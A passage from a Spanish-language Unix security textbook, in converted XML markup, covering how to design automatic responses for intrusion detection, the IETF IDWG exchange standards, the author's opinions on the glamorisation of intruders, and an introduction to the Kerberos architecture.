<!--br/-->Mucho m&#x00E1;s interesante que cualquiera de estas respuestas manuales es que el propio sensor sea capaz de
generar respuestas autom&#x00E1;ticas ante lo que &#x00E9;l considere un intento de ataque. Si elegimos esta opci&#x00F3;n, lo m&#x00E1;s
habitual suele ser un bloqueo total de la direcci&#x00F3;n atacante en nuestro cortafuegos, unida a una noti&#xFB01;caci&#x00F3;n
de cualquier tipo (SMS, e-mail&#x2026;) a los responsables de seguridad; es siempre recomendable efectuar esta
noti&#xFB01;caci&#x00F3;n (si no en tiempo real, si al menos registrando las medidas tomadas contra una
determinada direcci&#x00F3;n en un log) por motivos evidentes: si bloqueamos completamente el acceso
de alguien hacia nuestros sistemas, debemos pararnos a pensar que es posible que se trate
de un usuario autorizado que en ning&#x00FA;n momento atacaba nuestras m&#x00E1;quinas, a pesar de que
el sensor que hemos instalado opine lo contrario. No importa lo seguros que estemos de lo
que hacemos ni de las veces que hayamos revisado nuestra base de datos de patrones: nunca
podemos garantizar por completo que lo que nuestro IDS detecta como un ataque realmente lo
sea.
<!--br/-->
<!--br/-->Un correcto esquema de respuesta autom&#x00E1;tica (asumimos que vamos a bloquear la direcci&#x00F3;n que
presuntamente nos ataca) deber&#x02CA;&#x0131;a contemplar al menos los siguientes puntos:
     </para><itemizedlist>
     <listitem>
     <!--l. 1688--><para>&#x00BF;Qu&#x00E9; probabilidad hay de que el ataque detectado sea realmente un falso positivo?
     <!--br/-->No todos los ataques que un sensor detecta tienen la misma probabilidad de serlo realmente:
     por  ejemplo,  alguien  que  busca  en  nuestros  servidores  web un  CGI denominado  phf (un
     programa que se encuentra en versiones antiguas &#x2013; muy antiguas &#x2013; de Apache, y que presenta
     graves problemas de seguridad) casi con toda probabilidad trata de atacar nuestros sistemas;
     en cambio, una alarma generada porque el sensor detecta un paquete ICMP de formato
     sospechoso no tiene por qu&#x00E9; representar (y seguramente no lo har&#x00E1;) un verdadero ataque. Es
     necesario, o cuanto menos recomendable, asignar un peso espec&#x02CA;&#x0131;&#xFB01;co a cada alarma generada
     en el sensor, y actuar s&#x00F3;lo en el caso de que detectemos un ataque claro: o bien un evento que
     denote muy claramente un intento de intrusi&#x00F3;n, o bien varios menos sospechosos, pero cuya
     cantidad nos indique que no se trata de falsos positivos.
     </para></listitem>
     <listitem>
     <!--l. 1702--><para>&#x00BF;Debemos contemplar direcciones &#x2018;protegidas&#x2019;?
     <!--br/-->Otro punto a tener en cuenta antes de lanzar una respuesta autom&#x00E1;tica contra un potencial
     atacante  es  su  origen;  si  se  trata  de  una  direcci&#x00F3;n  externa,  seguramente  la  respuesta  ser&#x00E1;
     adecuada, pero si se trata de una interna a nuestra red (o equivalentemente, de direcciones de
     empresas colaboradoras, aunque sean externas) la cosa no est&#x00E1; tan clara. Debemos plantearnos
     que  quiz&#x00E1;s  estamos  bloqueando  el  acceso  a  alguien  a  quien,  por  los  motivos  que  sea,  no
     deber&#x02CA;&#x0131;amos hab&#x00E9;rselo bloqueado. Aunque se trate de cuestiones mas pol&#x02CA;&#x0131;ticas que t&#x00E9;cnicas, es
     muy probable que en nuestro IDS debamos tener claro un conjunto de direcciones contra
     las que no se va actuar; si desde ellas se detecta actividad sospechosa, podemos preparar un
     mecanismo que alerte a los responsables de seguridad y, bajo la supervisi&#x00F3;n de un humano,
     tomar las acciones que consideremos oportunas.
     </para></listitem>
     <listitem>

     <!--l. 1715--><para>&#x00BF;Hay un l&#x02CA;&#x0131;mite al n&#x00FA;mero de respuestas por unidad de tiempo?
     <!--br/-->Seguramente la respuesta inmediata a esta pregunta ser&#x02CA;&#x0131;a &#x2018;no&#x2019;; a &#xFB01;n de cuentas, si me atacan
     diez direcciones diferentes en menos de un minuto, &#x00BF;qu&#x00E9; hay de malo en actuar contra todas,
     bloque&#x00E1;ndolas? En principio esta ser&#x02CA;&#x0131;a la forma correcta de actuar, pero debemos pararnos a
     pensar en lo que es normal y lo que no lo es en nuestro entorno de trabajo. &#x00BF;Es realmente
     habitual que suframos ataques masivos y simult&#x00E1;neos desde diferentes direcciones de Internet?
     Dependiendo de nuestro entorno, se puede considerar una casualidad que dos o tres m&#x00E1;quinas
     diferentes decidan atacarnos al mismo tiempo; pero sin duda m&#x00E1;s de este n&#x00FA;mero resulta cuanto
     menos sospechoso. Un pirata puede simular ataques desde diferentes hosts de una forma m&#x00E1;s
     o menos sencilla y si nos limitamos a bloquear direcciones (o redes completas), es f&#x00E1;cil que
     nosotros mismos causemos una importante negaci&#x00F3;n de servicio contra potenciales usuarios
     leg&#x02CA;&#x0131;timos (por ejemplo, simples visitantes de nuestras p&#x00E1;ginas web o usuarios de correo), lo
     cual puede representar un ataque a nuestra seguridad m&#x00E1;s importante que el que causar&#x02CA;&#x0131;a ese
     mismo pirata si simplemente le permiti&#x00E9;ramos escanear nuestras m&#x00E1;quinas. Si nuestro sensor
     lanza demasiadas respuestas autom&#x00E1;ticas en un periodo de tiempo peque~no, el propio sistema
     debe encargarse de avisar a una persona que se ocupe de veri&#xFB01;car que todo es normal.</para></listitem></itemizedlist>
<!--l. 1736--><para>Teniendo en cuenta los puntos anteriores (y seguramente otros), debemos dise~nar un esquema de respuestas
autom&#x00E1;ticas adecuado. Un pseudoalgoritmo del funcionamiento de nuestro esquema podr&#x02CA;&#x0131;a ser el
siguiente:
                        ESTADO: {Detecci&#x00F3;n ataque}
                      SI umbral de respuestas superado: FIN                 SI NO
             Comprobaci&#x00F3;n IP atacante                       SI es IP protegida: FIN
             SI NO                                Ponderaci&#x00F3;n hist&#x00F3;rica de gravedad
                     SI umbral de gravedad superado: ACTUAR
                     SI NO                                      REGISTRAR
                     FSI                            FSI                    FSI
</para><!--l. 1757--><para>Como vemos, al detectar un ataque desde determinada direcci&#x00F3;n, el modelo comprueba que no se ha superado
el n&#x00FA;mero de respuestas m&#x00E1;ximo por unidad de tiempo (por ejemplo, que no se ha bloqueado ya un n&#x00FA;mero
determinado de direcciones en las &#x00FA;ltimas 24 horas); si este umbral ha sido sobrepasado no actuaremos de
ninguna forma autom&#x00E1;tica, principalmente para no causar importantes negaciones de servicio, pero si no lo
ha sido, se veri&#xFB01;ca que la direcci&#x00F3;n IP contra la que previsiblemente se actuar&#x00E1; no corresponde a una de
nuestras &#x2019;protegidas&#x2019;, por ejemplo a una m&#x00E1;quina de la red corporativa: si es as&#x02CA;&#x0131; se &#xFB01;naliza. Este &#x2018;&#xFB01;nalizar&#x2019;
no implica ni mucho menos que el ataque no haya sido detectado y se haya guardado un log del
mismo, simplemente que para evitar problemas mayores no actuamos en tiempo real contra la
m&#x00E1;quina: si corresponde al grupo de &#x2018;protegidas&#x2019; es porque tenemos cierta con&#xFB01;anza &#x2013; o cierto
control &#x2013; sobre la misma, por lo que un operador puede preocuparse m&#x00E1;s tarde de investigar
la alerta. Si se trata de una direcci&#x00F3;n no controlada ponderamos la gravedad del ataque: un
ataque con poca posibilidad de ser un falso positivo tendr&#x00E1; un peso elevado, mientras que uno
que pueda ser una falsa alarma tendr&#x00E1; un peso bajo; a&#x00FA;n as&#x02CA;&#x0131;, diferentes ataques de poco peso
pueden llegar a sobrepasar nuestro l&#x02CA;&#x0131;mite si se repiten en un intervalo de tiempo peque~no. Es
importante recalcar el &#x2018;diferentes&#x2019;, ya que si la alarma que se genera es todo el rato la misma
debemos plantearnos algo: &#x00BF;es posible que un proceso que se ejecuta peri&#x00F3;dicamente y que no se
trata de un ataque est&#x00E9; todo el rato levantando una falsa misma alarma? La respuesta es s&#x02CA;&#x0131;, y
evidentemente no debemos bloquearlo sin m&#x00E1;s; seguramente es m&#x00E1;s recomendable revisar nuestra base de
datos de patrones de ataques para ver por qu&#x00E9; se puede estar generando cont&#x02CA;&#x0131;nuamente dicha
alarma.
<!--br/-->

<!--br/-->Por &#x00FA;ltimo, si nuestro umbral no se ha superado debemos registrar el ataque, su peso y la hora en que se
produjo para poder hacer ponderaciones hist&#x00F3;ricas ante m&#x00E1;s alarmas generadas desde la misma direcci&#x00F3;n, y si
se ha superado el esquema debe efectuar la respuesta autom&#x00E1;tica: bloquear al atacante en el cortafuegos,
enviar un correo electr&#x00F3;nico al responsable de seguridad, etc. Debemos pensar que para llegar a este &#x00FA;ltimo
punto, tenemos que estar bastante seguros de que realmente hemos detectado a un pirata: no podemos
permitirnos el efectuar respuestas autom&#x00E1;ticas ante cualquier patr&#x00F3;n que nos parezca sospechoso
sin saber realmente &#x2013; o con una probabilidad alta &#x2013; que se trata de algo hostil a nuestros
sistemas.
<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar este punto, es necesario que volver a insistir una vez m&#x00E1;s en algo que ya hemos
comentado: es muy recomendable que ante cada respuesta se genere un aviso que pueda ser validado
por un administrador de sistemas o por responsables de seguridad, mejor si es en tiempo real; por muy
seguros que estemos del correcto funcionamiento de nuestro detector de intrusos, nadie nos
garantiza que no nos podamos encontrar ante comportamientos inesperados o indebidos, y con
toda certeza es m&#x00E1;s f&#x00E1;cil para una persona que para una m&#x00E1;quina darse cuenta de un error y
subsanarlo.
  </para></section><!--end subsection--><!--l. 1802--><section 
role="subsection"><title><abbrev role="title-mark">18.8.5</abbrev><anchor 
   id="x1-29300018.8.5"  ></anchor>Ampliaci&#x00F3;n del esquema</title>
<!--l. 1803--><para>  Las ideas que acabamos de comentar pueden resultar m&#x00E1;s o menos interesantes, pero presentan
varios problemas importantes que es necesario comentar. El primero y m&#x00E1;s importante es la
descentralizaci&#x00F3;n del esquema: tenemos implantadas varias aproximaciones a la detecci&#x00F3;n de
intrusos, pero hasta ahora no hemos hablado de la relaci&#x00F3;n entre ellas; cada uno de los modelos de
detecci&#x00F3;n y/o respuesta de los que hemos tratado puede actuar de forma independiente sin
muchos problemas, pero en los entornos actuales esto es cada vez menos habitual. Hoy en d&#x02CA;&#x0131;a,
lo normal es encontrarse arquitecturas de red segmentadas, con sensores en cada segmento
tanto a nivel de red como de host, as&#x02CA;&#x0131; como uno o varios cortafuegos corporativos en los que
tambi&#x00E9;n se lleva a cabo detecci&#x00F3;n de intrusos y respuesta autom&#x00E1;tica. Est&#x00E1; claro que tener elementos
independientes no es la aproximaci&#x00F3;n m&#x00E1;s adecuada, por lo que necesitamos un esquema capaz de
uni&#xFB01;car los ataques detectados, por ejemplo para correlar eventos y lanzar &#x00FA;nicamente una
respuesta autom&#x00E1;tica ante un mismo ataque, aunque se detecte simult&#x00E1;neamente en diferentes
sensores; sin ser tan ambiciosos, la centralizaci&#x00F3;n en una &#x00FA;nica consola puede ser necesaria para algo
tan simple como generar estad&#x02CA;&#x0131;sticas mensuales acerca del n&#x00FA;mero de ataques contra nuestro
entorno de trabajo: si un mismo ataque se detecta en varios sensores, &#x00BF;c&#x00F3;mo contabilizarlo? &#x00BF;c&#x00F3;mo
saber si se trata del mismo intruso o de varios? &#x00BF;qui&#x00E9;n de todos decide lanzar una respuesta
autom&#x00E1;tica?&#x2026;
<!--br/-->
<!--br/-->Para tratar de solucionar este importante problema, hace unos a~nos se de&#xFB01;ni&#x00F3; el grupo de trabajo IDWG
(Intrusion Detection Exchange Format Working Group), englobado dentro del IETF (Internet Engineering
Task Force); su prop&#x00F3;sito es obvio: tratar de de&#xFB01;nir est&#x00E1;ndares para el intercambio de informaci&#x00F3;n
entre los diferentes elementos de un sistema de detecci&#x00F3;n de intrusos y respuesta autom&#x00E1;tica,
tanto a nivel de formato de datos como de procedimientos de intercambio. Mediante esta
aproximaci&#x00F3;n se facilita enormemente tanto la integraci&#x00F3;n de sistemas, ya que de lo &#x00FA;nico que nos
debemos preocupar es que todos los elementos (sensores, consolas, elementos de respuesta&#x2026;)
sean capaces de &#x2018;hablar&#x2019; el est&#x00E1;ndar, como la escalabilidad: a~nadir a un entorno de detecci&#x00F3;n
distribuido un nuevo IDS, comercial o desarrollo propio, es mucho m&#x00E1;s sencillo, ya que casi
s&#x00F3;lo hemos de conseguir que el nuevo elemento utilice los formatos est&#x00E1;ndar de&#xFB01;nidos por el
IDWG.
<!--br/-->
<!--br/-->Hasta la fecha, el grupo de trabajo ha publicado cuatro borradores que cubren los requisitos (de alto nivel)
para las comunicaciones dentro del sistema de detecci&#x00F3;n de intrusos, el modelo de datos para
representar la informaci&#x00F3;n relevante para los IDSes &#x2013; incluyendo una implementaci&#x00F3;n en XML &#x2013;,
el protocolo BEEP (Blocks Extensible Exchange Protocol) aplicado a la detecci&#x00F3;n de intrusos,
y &#xFB01;nalmente el protocolo IDXP (Intrusion Detection eXchange Protocol) para intercambio
de informaci&#x00F3;n entre entidades de un sistema distribuido de detecci&#x00F3;n de intrusos. Sin duda el
primero y el &#x00FA;ltimo son especialmente importantes, ya que constituyen la base del sistema

de intercambio de datos entre los diferentes elementos del entorno: marcan el &#x2018;lenguaje&#x2019; que
antes dec&#x02CA;&#x0131;amos que ten&#x02CA;&#x0131;an que saber hablar todas y cada una de las entidades del sistema
distribuido.
<!--br/-->
<!--br/-->Desde http://www.ietf.org/html.charters/idwg-charter.html pueden consultarse los trabajos del
IDWG; se trata de un grupo activo, que realiza cont&#x02CA;&#x0131;nuamente revisiones y mejoras de sus borradores para
tratar de convertirlos en un est&#x00E1;ndar real. Si alg&#x00FA;n d&#x02CA;&#x0131;a esto es as&#x02CA;&#x0131;, habremos dado un paso muy importante
en el dise~no, implantaci&#x00F3;n y gesti&#x00F3;n de sistemas distribuidos de detecci&#x00F3;n de intrusos; lamentablemente,
muchos de los productos actuales no parecen tener mucho inter&#x00E9;s en acercarse al est&#x00E1;ndar (quiz&#x00E1;s por miedo a
perder cota de mercado). La integraci&#x00F3;n de algunos sistemas (como SNORT) es bastante inmediata, pero en
cambio la de otros &#x2013; especialmente productos comerciales, altamente cerrados &#x2013; no lo es tanto; mientras
esto no cambie, es dif&#x02CA;&#x0131;cil que se consiga implantar el est&#x00E1;ndar, as&#x02CA;&#x0131; que &#x00F3;jala estos fabricantes se den
cuenta de que su adaptaci&#x00F3;n a los borradores del IDWG produce sin duda m&#x00E1;s bene&#xFB01;cios que
da~nos.
  </para></section><!--end subsection--></section><!--end section--><!--l. 1864--><section 
role="section"><title><abbrev role="title-mark">18.9</abbrev><anchor 
   id="x1-29400018.9"  ></anchor>Algunas re&#xFB02;exiones</title>
<!--l. 1865--><para>
</para><section role="center"><title/>
<!--l. 1865--><para> NOTA: Este punto es completamente subjetivo, se trata s&#x00F3;lo de opiniones personales, tan v&#x00E1;lidas o
tan err&#x00F3;neas como cualquier otra opini&#x00F3;n personal, e igual de respetables.</para></section>
<!--l. 1870--><para>Por desgracia, los piratas inform&#x00E1;ticos, los intrusos, est&#x00E1;n cada d&#x02CA;&#x0131;a m&#x00E1;s de moda; sin duda alguna los problemas
de seguridad que m&#x00E1;s &#x2018;gustan&#x2019; a la sociedad son los relacionados con hackers, crackers o como esta
semana los medios hayan decidido llamar a los piratas inform&#x00E1;ticos: evidentemente, es mucho
m&#x00E1;s interesante y sensacionalista cualquier atacante que modi&#xFB01;que la p&#x00E1;gina web del Pent&#x00E1;gono
que las investigaciones o los descubrimientos de gente como Marcus Ranum, Gene Spa&#xFB00;ord o
Ross Anderson, por poner s&#x00F3;lo unos ejemplos. Es as&#x02CA;&#x0131; de triste: al contrario de lo que grandes
expertos en seguridad han manifestado en repetidas ocasiones (<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation>&#x2026;) mucha gente
considera a los intrusos como h&#x00E9;roes, como j&#x00F3;venes inteligentes que utilizan sus ordenadores
para poner en jaque a grandes organizaciones &#x2013; pol&#x02CA;&#x0131;ticas, empresariales, militares&#x2026;&#x2013; con un
simple teclado, sin disparar ni un solo tiro, sin quemar autobuses o sin lanzar piedras desde
una barricada; seguramente nadie se ha parado a pensar que ese pirata al que hoy admira
ma~nana puede entrar en el PC de su casa y formatearle el disco duro simplemente porque le
apetec&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->Aparte de esta presunta &#x2018;demostraci&#x00F3;n de inteligencia&#x2019;, otro argumento muy utilizado por los
defensores de los crackers es el derecho a la libertad de informaci&#x00F3;n de toda persona: ven a los
piratas como un peque~no David que triunfa sobre el gran Goliat y descubre todos sus secretos
simplemente con un peque~no ordenador casero; parad&#x00F3;jicamente, son estas personas las que
luego ponen el grito en el cielo y reivindican ciegamente su derecho a la privacidad cuando
se enteran de la existencia de redes como ECHELON, dedicada en teor&#x02CA;&#x0131;a al espionaje de las
telecomunicaciones (correo electr&#x00F3;nico incluido) de todo el mundo, y puesta en marcha por los gobiernos
estadounidense y brit&#x00E1;nico, en colaboraci&#x00F3;n con el canadiense, australiano y neozeland&#x00E9;s. &#x00BF;Qu&#x00E9;
diferencia hay entre un gobierno que esp&#x02CA;&#x0131;a nuestro correo y un cracker que esnifa nuestras
claves? &#x00BF;Qui&#x00E9;n decide qu&#x00E9; es m&#x00E1;s &#x2018;privado&#x2019; para m&#x02CA;&#x0131;, si mi correo o mis contrase~nas? &#x00BF;Un juez
que a duras penas conoce la diferencia entre &#x2018;asterisco&#x2019; y &#x2018;asteroide&#x2019;? Ser&#x02CA;&#x0131;a muy interesante
plantearselo&#x2026;
<!--br/-->
<!--br/-->La simpat&#x02CA;&#x0131;a social hacia los piratas es tal que incluso existen empresas que se jactan de contratar a estas
personas, y mucho mejor &#x2013; m&#x00E1;s publicidad &#x2013; cuanto m&#x00E1;s &#x2018;malos&#x2019; hayan sido en el pasado o cuanto m&#x00E1;s eleet
haya sido o sea su apodo (muy pocos contratar&#x02CA;&#x0131;an a un pirata que se haga llamar &#x2018;Manolo&#x2019;, pero si su alias
era &#x2018;Z3roK00l&#x2019; tiene m&#x00E1;s posibilidades ;-); as&#x02CA;&#x0131; lo pueden disfrazar de arrepentido, como alguien que
cambia de bando (&#x2018;hacking &#x00E9;tico&#x2019; es la palabra que a los departamentos de marketing les gusta
utilizar para hablar de esta tendencia). Seguramente, de las personas que dejan auditar sus

entornos inform&#x00E1;ticos a piratas (ex&#x2013;piratas, perd&#x00F3;n), muy pocos dejar&#x02CA;&#x0131;an una parcela de bosque
de su propiedad al cuidado de un pir&#x00F3;mano (de nuevo, ex&#x2013;pir&#x00F3;mano), y eso a pesar de que,
siguiendo la teor&#x02CA;&#x0131;a que han aplicado a sus redes y a sus sistemas, nadie conocer&#x00E1; mejor que un
antiguo pir&#x00F3;mano los secretos de las t&#x00E1;cticas de provocaci&#x00F3;n de incendios forestales, por lo que
nadie mejor que &#x00E9;l para evitar que se produzcan&#x2026;&#x00BF;verdad? Por supuesto, todos podemos haber
cometido errores en el pasado, pero si no existe un claro cambio de conducta por su parte,
alguien que haya sido un pirata es muy probable que lo siga siendo, aunque ahora cobre por
ello.
<!--br/-->
<!--br/-->Sin entrar a juzgar la inteligencia o la &#x00E9;tica de estos individuos &#x2013; evidentemente, habr&#x00E1; de todo en la
comunidad underground &#x2013;, desde un punto de vista t&#x00E9;cnico sus actividades no dicen nada a su
favor; seguramente la actitud de estos delincuentes ser&#x00E1; m&#x00E1;s interesante para un psiquiatra,
un soci&#x00F3;logo o un psic&#x00F3;logo de lo que lo pueda ser para un inform&#x00E1;tico&#x2026;Las &#x2018;haza~nas&#x2019; de estas
personas constituyen un obvio problema de seguridad tanto para nuestras redes como para
nuestras m&#x00E1;quinas; para evitar los t&#x02CA;&#x0131;picos con&#xFB02;ictos de denominaci&#x00F3;n (&#x00BF;hackers o crackers?) hemos
decidido llamar a los piratas inform&#x00E1;ticos intrusos o simplemente piratas. Los problemas que
nos causan no son algo nuevo: como ya dijimos en el primer punto, el primer trabajo sobre
detecci&#x00F3;n de intrusos data de 1980 (<citation>[?]</citation>), y desde entonces este campo ha sido, es, y con toda
probabilidad seguir&#x00E1; siendo, uno de los m&#x00E1;s activos en la investigaci&#x00F3;n dentro del mundo de la seguridad
inform&#x00E1;tica.



</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-29500019"  ></anchor>Kerberos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">19.1</abbrev><anchor 
   id="x1-29600019.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Durante 1983 en el M.I.T. (Massachussetts Institute of Technology) comenz&#x00F3; el proyecto Athena con el
objetivo de crear un entorno de trabajo educacional compuesto por estaciones gr&#x00E1;&#xFB01;cas, redes
de alta velocidad y servidores; el sistema operativo para implementar este entorno era Unix
4.3BSD, y el sistema de autenticaci&#x00F3;n utilizado en el proyecto se denomin&#x00F3; Kerberos (<citation>[?]</citation>) en honor
al perro de tres cabezas que en la mitolog&#x02CA;&#x0131;a griega vigila la puerta de entrada a Hades, el
in&#xFB01;erno.
<!--br/-->
<!--br/-->Hasta que se dise~n&#x00F3; Kerberos, la autenticaci&#x00F3;n en redes de computadores se realizaba principalmente de dos
formas: o bien se aplicaba la autenticaci&#x00F3;n por declaraci&#x00F3;n (Authentication by assertion), en la que el usuario
es libre de indicar el servicio al que desea acceder (por ejemplo, mediante el uso de un cliente
determinado), o bien se utilizaban contrase~nas para cada servicio de red. Evidentemente el primer modelo
proporciona un nivel de seguridad muy bajo, ya que se le otorga demasiado poder al cliente sobre
el servidor; el segundo modelo tampoco es muy bueno: por un lado se obliga al usuario a
ir tecleando cont&#x02CA;&#x0131;nuamente su clave, de forma que se pierde demasiado tiempo y adem&#x00E1;s la
contrase~na est&#x00E1; viajando cont&#x02CA;&#x0131;nuamente por la red. Kerberos trata de mejorar estos esquemas
intentando por un lado que un cliente necesite autorizaci&#x00F3;n para comunicar con un servidor (y que
esa autorizaci&#x00F3;n provenga de una m&#x00E1;quina con&#xFB01;able), y por otro eliminando la necesidad de
demostrar el conocimiento de informaci&#x00F3;n privada (la contrase~na del usuario) divulgando dicha
informaci&#x00F3;n.
<!--br/-->
<!--br/-->Kerberos se ha convertido desde entonces en un referente obligatorio a la hora de hablar de seguridad en
redes. Se encuentra disponible para la mayor&#x02CA;&#x0131;a de sistemas Unix, y viene integrado con OSF/DCE
(Distributed Computing Environment). Est&#x00E1; especialmente recomendado para sistemas operativos
distribuidos, en los que la autenticaci&#x00F3;n es una pieza fundamental para su funcionamiento: si conseguimos
que un servidor logre conocer la identidad de un cliente puede decidir sobre la concesi&#x00F3;n de un servicio o la
asignaci&#x00F3;n de privilegios especiales. Sigue vigente en la actualidad (en su versi&#x00F3;n V a la hora de escribir
este trabajo), a pesar del tiempo transcurrido desde su dise~no; adem&#x00E1;s fu&#x00E9; el pionero de los
sistemas de autenticaci&#x00F3;n para sistemas en red, y muchos otros dise~nados posteriormente, como
KryptoKnight (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;), SESAME (<citation>[?]</citation>) o Charon (<citation>[?]</citation>) se basan en mayor o menor medida en
Kerberos.
<!--br/-->
<!--br/-->El uso de Kerberos se produce principalmente en el login, en el acceso a otros servidores (por ejemplo,
mediante rlogin) y en el acceso a sistemas de &#xFB01;cheros en red como NFS. Una vez que un cliente est&#x00E1;
autenticado o bien se asume que todos sus mensajes son &#xFB01;ables, o si se desea mayor seguridad se
puede elegir trabajar con mensajes seguros (autenticados) o privados (autenticados y cifrados).
Kerberos se puede implementar en un servidor que se ejecute en una m&#x00E1;quina segura, mediante un
conjunto de bibliotecas que utilizan tanto los clientes como las aplicaciones; se trata de un
sistema f&#x00E1;cilmente escalable y que admite replicaci&#x00F3;n, por lo que se puede utilizar incluso en
sistemas de alta disponibilidad (aunque como veremos al &#xFB01;nal del cap&#x02CA;&#x0131;tulo est&#x00E1; fuertemente
centralizado).
  </para></section><!--end section--><!--l. 53--><section 
role="section"><title><abbrev role="title-mark">19.2</abbrev><anchor 
   id="x1-29700019.2"  ></anchor>Arquitectura de Kerberos</title>
<!--l. 54--><para>  Un servidor Kerberos se denomina KDC (Kerberos Distribution Center), y provee de dos servicios
fundamentales: el de autenticaci&#x00F3;n (AS, Authentication Service) y el de tickets (TGS, Ticket Granting
Service). El primero tiene como funci&#x00F3;n autenticar inicialmente a los clientes y proporcionarles un ticket
para comunicarse con el segundo, el servidor de tickets, que proporcionar&#x00E1; a los clientes las credenciales
necesarias para comunicarse con un servidor &#xFB01;nal que es quien realmente ofrece un servicio.
Adem&#x00E1;s, el servidor posee una base de datos de sus clientes (usuarios o programas) con sus
respectivas claves privadas, conocidas &#x00FA;nicamente por dicho servidor y por el cliente que al que
pertenece.
<!--br/-->
<!--br/-->La arquitectura de Kerberos est&#x00E1; basada en tres objetos de seguridad: Clave de Sesi&#x00F3;n, Ticket y

Autenticador.
     </para><itemizedlist>
     <listitem>
     <!--l. 68--><para> La clave de sesi&#x00F3;n es una clave secreta generada por Kerberos y expedida a un cliente para
     uso con un servidor durante una sesi&#x00F3;n; no es obligatorio utilizarla en toda la comunicaci&#x00F3;n con
     el servidor, s&#x00F3;lo si el servidor lo requiere (porque los datos son con&#xFB01;denciales) o si el servidor es
     un servidor de autenticaci&#x00F3;n. Se suele denominar a esta clave <informalequation><graphic 
fileref="unixsec325x.gif"></graphic></informalequation>, para la comunicaci&#x00F3;n entre
     un cliente C y un servidor S.
     <!--br/-->Las claves de sesi&#x00F3;n se utilizan para minimizar el uso de las claves secretas de los diferentes
     agentes: &#x00E9;stas &#x00FA;ltimas son v&#x00E1;lidas durante mucho tiempo, por lo que es conveniente para minimizar
     ataques utilizarlas lo menos posible.
     </para></listitem>
     <listitem>
     <!--l. 79--><para>  El  ticket  es  un  testigo  expedido  a  un  cliente  del  servicio  de  tickets  de  Kerberos
     para  solicitar  los  servicios  de  un  servidor;  garantiza  que  el  cliente  ha  sido  autenticado
     recientemente. A un ticket de un cliente C para acceder a un servicio S se le denomina
     <informalequation><graphic 
fileref="unixsec326x.gif"></graphic></informalequation>. Este ticket incluye el nombre del cliente C, para
     evitar su posible uso por impostores, un periodo de validez <informalequation><graphic 
fileref="unixsec327x.gif"></graphic></informalequation> y una clave de sesi&#x00F3;n <informalequation><graphic 
fileref="unixsec328x.gif"></graphic></informalequation>
     asociada para uso de cliente y servidor. Kerberos siempre proporciona el ticket ya cifrado con
     la clave secreta del servidor al que se le entrega.
     </para></listitem>
     <listitem>
     <!--l. 91--><para> El autenticador es un testigo construido por el cliente y enviado a un servidor para probar su
     identidad y la actualidad de la comunicaci&#x00F3;n; s&#x00F3;lo puede ser utilizado una vez. Un autenticador de
     un cliente C ante un servidor S se denota por <informalequation><graphic 
fileref="unixsec329x.gif"></graphic></informalequation>. Este autenticador
     contiene, cifrado con la clave de la sesi&#x00F3;n, el nombre del cliente y un timestamp.
     <!--br/--></para></listitem></itemizedlist>
<!--l. 99--><para>Kerberos sigue de cerca el protocolo de Needham y Schroeder (<citation>[?]</citation>) con clave secreta, utilizando timestamps
como pruebas de frescura con dos prop&#x00F3;sitos: evitar reenv&#x02CA;&#x0131;os de viejos mensajes capturados en la red o la
reutilizaci&#x00F3;n de viejos tickets obtenidos de zonas de memoria del usuario autorizado, y a la vez poder
revocar a los usuarios los derechos al cabo de un tiempo.
  </para></section><!--end section--><!--l. 106--><section 
role="section"><title><abbrev role="title-mark">19.3</abbrev><anchor 
   id="x1-29800019.3"  ></anchor>Autenticaci&#x00F3;n</title>
<!--l. 107--><para>  El protocolo de autenticaci&#x00F3;n de Kerberos es un proceso en el que diferentes elementos colaboran para
conseguir identi&#xFB01;car a un cliente que solicita un servicio ante un servidor que lo ofrece; este proceso se
realiza en tres grandes etapas que a continuaci&#x00F3;n se describen. En la tabla  <ulink 
  url="#x1-2980011"  ><!--ref: kerb-abbr--></ulink> se muestran las abreviaturas
utilizadas, y en la &#xFB01;gura  <ulink 
  url="#x1-3010011"  ><!--ref: kerb--></ulink> un resumen gr&#x00E1;&#xFB01;co de este protocolo.


</para><section role="center"><title/>
<!--l. 114--><para> </para><table ><informaltable><tgroup cols="2"><tbody><row><entry 
 align="center"><para>  C  </para></entry><entry 
 align="center"><para>         Cliente que solicita un servicio              </para></entry>
 </row><row><entry 
 align="center"><para>  S  </para></entry><entry 
 align="center"><para>        Servidor que ofrece dicho servicio             </para></entry>
 </row><row><entry 
 align="center"><para>  A  </para></entry><entry 
 align="center"><para>            Servidor de autenticaci&#x00F3;n                   </para></entry>
 </row><row><entry 
 align="center"><para>  T  </para></entry><entry 
 align="center"><para>              Servidor de tickets                     </para></entry>
 </row><row><entry 
 align="center"><para> K<informalequation><graphic 
fileref="unixsec330x.gif"></graphic></informalequation> </para></entry><entry 
 align="center"><para>            Clave secreta del cliente                   </para></entry>
 </row><row><entry 
 align="center"><para> K<informalequation><graphic 
fileref="unixsec331x.gif"></graphic></informalequation> </para></entry><entry 
 align="center"><para>           Clave secreta del servidor                  </para></entry>
 </row><row><entry 
 align="center"><para> K<informalequation><graphic 
fileref="unixsec332x.gif"></graphic></informalequation> </para></entry><entry 
 align="center"><para>       Clave secreta del servidor de tickets          </para></entry>
 </row><row><entry 
 align="center"><para>K<informalequation><graphic 
fileref="unixsec333x.gif"></graphic></informalequation></para></entry><entry 
 align="center"><para>Clave de sesi&#x00F3;n entre el cliente y el servidor de tickets</para></entry>
 </row><row><entry 
 align="center"><para>K<informalequation><graphic 
fileref="unixsec334x.gif"></graphic></informalequation></para></entry><entry 
 align="center"><para>      Clave de sesi&#x00F3;n entre cliente y servidor          </para></entry>
 </row><row><entry 
 align="center"><para>      </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2980011"  ></anchor>Cuadro&#x00A0;19.1</title><para>Abreviaturas utilizadas.</para></blockquote>
</section>

  <!--l. 140--><section 
role="subsection"><title><abbrev role="title-mark">19.3.1</abbrev><anchor 
   id="x1-29900019.3.1"  ></anchor>Login</title>
<!--l. 141--><para>  Inicialmente el cliente C (en este caso el usuario a trav&#x00E9;s del programa login) necesita obtener las
